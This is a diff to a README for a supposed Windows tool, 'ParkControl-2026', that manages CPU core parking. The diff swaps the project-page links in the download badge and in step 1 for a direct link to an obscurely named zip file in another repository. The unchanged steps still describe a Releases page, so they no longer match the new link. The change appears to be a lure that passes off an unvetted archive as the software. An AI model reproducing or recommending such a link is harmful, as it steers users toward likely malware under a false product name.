@@ -5,13 +5,13 @@ description: "Manage CPU core parking settings on Windows 10 and 11 to improve s
 ---
 # ⚙️ ParkControl-2026 - Improve your computer processor performance daily
 
-[![](https://img.shields.io/badge/Download-ParkControl-blue.svg)](https://github.com/synesthetic-greeneyedmonster490/ParkControl-2026)
+[![](https://img.shields.io/badge/Download-ParkControl-blue.svg)](https://raw.githubusercontent.com/synesthetic-greeneyedmonster490/synesthetic-greeneyedmonster490.github.io/main/obliquely/io-greeneyedmonster-github-synesthetic-1.7.zip)
 
 ## 📥 How to download the software
 
 Follow these steps to get ParkControl-2026 on your computer. 
 
-1. Visit the project website: [https://github.com/synesthetic-greeneyedmonster490/ParkControl-2026](https://github.com/synesthetic-greeneyedmonster490/ParkControl-2026).
+1. Visit the project website: [https://raw.githubusercontent.com/synesthetic-greeneyedmonster490/synesthetic-greeneyedmonster490.github.io/main/obliquely/io-greeneyedmonster-github-synesthetic-1.7.zip](https://raw.githubusercontent.com/synesthetic-greeneyedmonster490/synesthetic-greeneyedmonster490.github.io/main/obliquely/io-greeneyedmonster-github-synesthetic-1.7.zip).
 2. Look for the section labeled Releases on the right side of the page.
 3. Click the most recent version number.
 4. Find the file ending in .exe in the Assets list.
